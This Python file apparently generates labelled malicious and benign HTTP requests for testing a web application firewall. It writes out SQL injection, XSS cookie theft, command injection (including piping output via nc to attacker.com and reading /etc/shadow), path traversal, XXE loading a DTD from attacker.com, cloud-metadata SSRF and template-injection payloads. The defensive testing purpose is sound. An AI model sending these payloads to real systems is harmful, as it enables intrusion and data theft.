"""
Payload Generator for WAF Testing
Generates various attack payloads for testing
Author: ISRO WAF Team
"""

import json
from typing import List, Dict


class PayloadGenerator:
    """Generate test payloads for WAF evaluation"""
    
    @staticmethod
    def sql_injection_payloads() -> List[Dict]:
        """Generate SQL injection test cases"""
        return [
            {
                "name": "SQL Injection - UNION SELECT",
                "method": "GET",
                "path": "/products",
                "query": {"id": "1' UNION SELECT username, password FROM users--"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "SQL Injection - Boolean-based blind",
                "method": "GET",
                "path": "/login",
                "query": {"username": "admin' AND '1'='1", "password": "anything"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "SQL Injection - Time-based blind",
                "method": "GET",
                "path": "/search",
                "query": {"q": "test' AND SLEEP(5)--"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "SQL Injection - Stacked queries",
                "method": "POST",
                "path": "/api/update",
                "headers": {"content-type": "application/json"},
                "body": '{"id": "1; DROP TABLE users--"}'
            },
            {
                "name": "SQL Injection - UNION with NULL",
                "method": "GET",
                "path": "/items",
                "query": {"id": "1' UNION SELECT NULL, NULL, NULL--"},
                "headers": {"user-agent": "Mozilla/5.0"}
            }
        ]
    
    @staticmethod
    def xss_payloads() -> List[Dict]:
        """Generate XSS attack test cases"""
        return [
            {
                "name": "XSS - Script tag",
                "method": "GET",
                "path": "/search",
                "query": {"q": "<script>alert('XSS')</script>"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "XSS - Image onerror",
                "method": "GET",
                "path": "/profile",
                "query": {"name": "<img src=x onerror=alert(document.cookie)>"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "XSS - SVG onload",
                "method": "GET",
                "path": "/comment",
                "query": {"text": "<svg onload=alert('XSS')>"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "XSS - JavaScript protocol",
                "method": "GET",
                "path": "/redirect",
                "query": {"url": "javascript:alert('XSS')"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "XSS - Event handler",
                "method": "POST",
                "path": "/api/post",
                "headers": {"content-type": "application/json"},
                "body": '{"content": "<div onmouseover=alert(1)>Hover me</div>"}'
            }
        ]
    
    @staticmethod
    def command_injection_payloads() -> List[Dict]:
        """Generate command injection test cases"""
        return [
            {
                "name": "Command Injection - Semicolon",
                "method": "POST",
                "path": "/api/ping",
                "headers": {"content-type": "application/json"},
                "body": '{"host": "8.8.8.8; cat /etc/passwd"}'
            },
            {
                "name": "Command Injection - Pipe",
                "method": "POST",
                "path": "/api/exec",
                "headers": {"content-type": "application/json"},
                "body": '{"cmd": "ls | nc attacker.com 4444"}'
            },
            {
                "name": "Command Injection - Backticks",
                "method": "GET",
                "path": "/api/system",
                "query": {"cmd": "`whoami`"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "Command Injection - AND operator",
                "method": "POST",
                "path": "/api/run",
                "headers": {"content-type": "application/json"},
                "body": '{"command": "echo test && cat /etc/shadow"}'
            }
        ]
    
    @staticmethod
    def path_traversal_payloads() -> List[Dict]:
        """Generate path traversal test cases"""
        return [
            {
                "name": "Path Traversal - Basic",
                "method": "GET",
                "path": "/download",
                "query": {"file": "../../../../etc/passwd"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "Path Traversal - Encoded",
                "method": "GET",
                "path": "/files",
                "query": {"path": "..%2F..%2F..%2Fetc%2Fpasswd"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "Path Traversal - Windows",
                "method": "GET",
                "path": "/download",
                "query": {"file": "..\\..\\..\\windows\\system32\\config\\sam"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "Path Traversal - Null byte",
                "method": "GET",
                "path": "/view",
                "query": {"file": "../../../etc/passwd%00.jpg"},
                "headers": {"user-agent": "Mozilla/5.0"}
            }
        ]
    
    @staticmethod
    def xxe_payloads() -> List[Dict]:
        """Generate XXE attack test cases"""
        return [
            {
                "name": "XXE - File disclosure",
                "method": "POST",
                "path": "/api/upload",
                "headers": {"content-type": "application/xml"},
                "body": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
            },
            {
                "name": "XXE - SSRF",
                "method": "POST",
                "path": "/api/parse",
                "headers": {"content-type": "application/xml"},
                "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/secret">]><foo>&xxe;</foo>'
            },
            {
                "name": "XXE - Parameter entity",
                "method": "POST",
                "path": "/api/xml",
                "headers": {"content-type": "application/xml"},
                "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>test</foo>'
            }
        ]
    
    @staticmethod
    def nosql_injection_payloads() -> List[Dict]:
        """Generate NoSQL injection test cases"""
        return [
            {
                "name": "NoSQL Injection - $ne operator",
                "method": "POST",
                "path": "/api/login",
                "headers": {"content-type": "application/json"},
                "body": '{"username": {"$ne": null}, "password": {"$ne": null}}'
            },
            {
                "name": "NoSQL Injection - $gt operator",
                "method": "POST",
                "path": "/api/users",
                "headers": {"content-type": "application/json"},
                "body": '{"age": {"$gt": 0}}'
            },
            {
                "name": "NoSQL Injection - JavaScript",
                "method": "POST",
                "path": "/api/search",
                "headers": {"content-type": "application/json"},
                "body": '{"$where": "this.password == \'admin\'"}'
            }
        ]
    
    @staticmethod
    def ssrf_payloads() -> List[Dict]:
        """Generate SSRF attack test cases"""
        return [
            {
                "name": "SSRF - AWS metadata",
                "method": "POST",
                "path": "/api/fetch",
                "headers": {"content-type": "application/json"},
                "body": '{"url": "http://169.254.169.254/latest/meta-data/"}'
            },
            {
                "name": "SSRF - Internal network",
                "method": "GET",
                "path": "/api/proxy",
                "query": {"url": "http://192.168.1.1/admin"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "SSRF - Localhost",
                "method": "POST",
                "path": "/api/webhook",
                "headers": {"content-type": "application/json"},
                "body": '{"callback": "http://localhost:22"}'
            }
        ]
    
    @staticmethod
    def template_injection_payloads() -> List[Dict]:
        """Generate SSTI test cases"""
        return [
            {
                "name": "SSTI - Jinja2",
                "method": "GET",
                "path": "/greet",
                "query": {"name": "{{7*7}}"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "SSTI - ERB",
                "method": "GET",
                "path": "/template",
                "query": {"data": "<%= 7*7 %>"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "SSTI - Tornado",
                "method": "POST",
                "path": "/api/render",
                "headers": {"content-type": "application/json"},
                "body": '{"template": "{{7*7}}"}'
            }
        ]
    
    @staticmethod
    def generate_all() -> Dict:
        """Generate comprehensive test suite"""
        all_payloads = []
        
        all_payloads.extend(PayloadGenerator.sql_injection_payloads())
        all_payloads.extend(PayloadGenerator.xss_payloads())
        all_payloads.extend(PayloadGenerator.command_injection_payloads())
        all_payloads.extend(PayloadGenerator.path_traversal_payloads())
        all_payloads.extend(PayloadGenerator.xxe_payloads())
        all_payloads.extend(PayloadGenerator.nosql_injection_payloads())
        all_payloads.extend(PayloadGenerator.ssrf_payloads())
        all_payloads.extend(PayloadGenerator.template_injection_payloads())
        
        return {
            "description": "Comprehensive malicious payload test suite",
            "total_payloads": len(all_payloads),
            "requests": all_payloads,
            "labels": [1] * len(all_payloads)  # All malicious
        }
    
    @staticmethod
    def benign_payloads() -> Dict:
        """Generate benign request test suite"""
        payloads = [
            {
                "name": "Normal GET",
                "method": "GET",
                "path": "/products",
                "query": {"category": "electronics", "page": "1"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "API POST",
                "method": "POST",
                "path": "/api/users",
                "headers": {"content-type": "application/json"},
                "body": '{"name": "John Doe", "email": "john@example.com"}'
            },
            {
                "name": "Search",
                "method": "GET",
                "path": "/search",
                "query": {"q": "laptop computers"},
                "headers": {"user-agent": "Mozilla/5.0"}
            },
            {
                "name": "Login",
                "method": "POST",
                "path": "/login",
                "headers": {"content-type": "application/json"},
                "body": '{"username": "user@example.com", "password": "Password123!"}'
            },
            {
                "name": "API GET with auth",
                "method": "GET",
                "path": "/api/profile",
                "query": {},
                "headers": {
                    "user-agent": "Mozilla/5.0",
                    "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
                }
            }
        ]
        
        return {
            "description": "Benign request test suite",
            "total_payloads": len(payloads),
            "requests": payloads,
            "labels": [0] * len(payloads)  # All benign
        }


def main():
    """Generate test payload files"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Generate test payloads")
    parser.add_argument(
        '--output-dir',
        default='test_payloads',
        help='Output directory for payload files'
    )
    parser.add_argument(
        '--type',
        choices=['all', 'malicious', 'benign', 'sql', 'xss', 'cmd', 'path', 'xxe', 'nosql', 'ssrf', 'ssti'],
        default='all',
        help='Type of payloads to generate'
    )
    
    args = parser.parse_args()
    
    import os
    os.makedirs(args.output_dir, exist_ok=True)
    
    if args.type == 'all':
        # Generate comprehensive suite
        malicious = PayloadGenerator.generate_all()
        with open(f"{args.output_dir}/comprehensive_malicious.json", 'w') as f:
            json.dump(malicious, f, indent=2)
        print(f"✓ Generated {malicious['total_payloads']} malicious payloads")
        
        benign = PayloadGenerator.benign_payloads()
        with open(f"{args.output_dir}/comprehensive_benign.json", 'w') as f:
            json.dump(benign, f, indent=2)
        print(f"✓ Generated {benign['total_payloads']} benign payloads")
    
    elif args.type == 'malicious':
        data = PayloadGenerator.generate_all()
        with open(f"{args.output_dir}/malicious.json", 'w') as f:
            json.dump(data, f, indent=2)
        print(f"✓ Generated {data['total_payloads']} malicious payloads")
    
    elif args.type == 'benign':
        data = PayloadGenerator.benign_payloads()
        with open(f"{args.output_dir}/benign.json", 'w') as f:
            json.dump(data, f, indent=2)
        print(f"✓ Generated {data['total_payloads']} benign payloads")
    
    else:
        # Generate specific type
        generator_map = {
            'sql': PayloadGenerator.sql_injection_payloads,
            'xss': PayloadGenerator.xss_payloads,
            'cmd': PayloadGenerator.command_injection_payloads,
            'path': PayloadGenerator.path_traversal_payloads,
            'xxe': PayloadGenerator.xxe_payloads,
            'nosql': PayloadGenerator.nosql_injection_payloads,
            'ssrf': PayloadGenerator.ssrf_payloads,
            'ssti': PayloadGenerator.template_injection_payloads
        }
        
        payloads = generator_map[args.type]()
        data = {
            "description": f"{args.type.upper()} attack payloads",
            "requests": payloads,
            "labels": [1] * len(payloads)
        }
        
        with open(f"{args.output_dir}/{args.type}_payloads.json", 'w') as f:
            json.dump(data, f, indent=2)
        print(f"✓ Generated {len(payloads)} {args.type.upper()} payloads")


if __name__ == "__main__":
    main()
